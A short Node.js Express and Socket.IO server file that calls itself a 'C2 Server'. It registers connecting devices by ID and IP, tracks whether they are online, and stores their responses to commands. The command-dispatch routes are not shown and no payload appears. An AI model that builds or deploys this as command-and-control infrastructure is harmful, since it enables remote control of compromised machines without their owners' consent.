require("dotenv").config();
const express = require("express");
const http = require("http");
const socketIo = require("socket.io");
const mongoose = require("./config/db");
const Device = require("./models/Device");
const Command = require("./models/Command");

const app = express();
const server = http.createServer(app);
const io = socketIo(server, { cors: { origin: "*" } });

// Middleware
app.use(express.json());
app.use("/api/devices", require("./routes/devices"));
app.use("/api/commands", require("./routes/commands"));

// WebSocket handling
io.on("connection", (socket) => {
    console.log("New device connected:", socket.id);

    socket.on("register", async (data) => {
        const { deviceId, ip } = data;
        await Device.findOneAndUpdate(
            { deviceId },
            { ip, status: "online", lastSeen: new Date() },
            { upsert: true, new: true }
        );
        console.log(`Device registered: ${deviceId}`);
    });

    socket.on("disconnect", async () => {
        await Device.findOneAndUpdate({ socketId: socket.id }, { status: "offline" });
        console.log(`Device disconnected: ${socket.id}`);
    });

    socket.on("command_response", async (data) => {
        await Command.findByIdAndUpdate(data.commandId, { response: data.response });
    });
});

// Start server
server.listen(3000, () => console.log("C2 Server running on port 3000"));
